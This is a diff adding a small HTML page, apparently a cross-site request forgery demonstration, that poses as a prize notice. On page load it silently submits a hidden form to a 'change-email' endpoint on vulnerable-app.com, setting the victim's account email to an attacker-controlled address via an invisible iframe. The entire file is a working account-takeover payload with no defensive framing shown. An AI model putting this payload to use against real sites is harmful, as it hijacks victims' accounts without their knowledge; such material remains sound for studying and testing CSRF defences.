@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>You've Won a Prize!</title>
+</head>
+<body onload="document.forms[0].submit()">
+
+    <h1>Congratulations! Your prize is being processed.</h1>
+    <p>Please wait a moment...</p>
+
+   
+    <iframe style="display:none" name="hiddenFrame"></iframe>
+
+   
+    <form action="http://vulnerable-app.com/change-email" method="post" target="hiddenFrame">
+        
+        
+        <input type="hidden" name="email" value="attacker-controlled@email.com">
+        
+    </form>
+
+</body>
+</html>
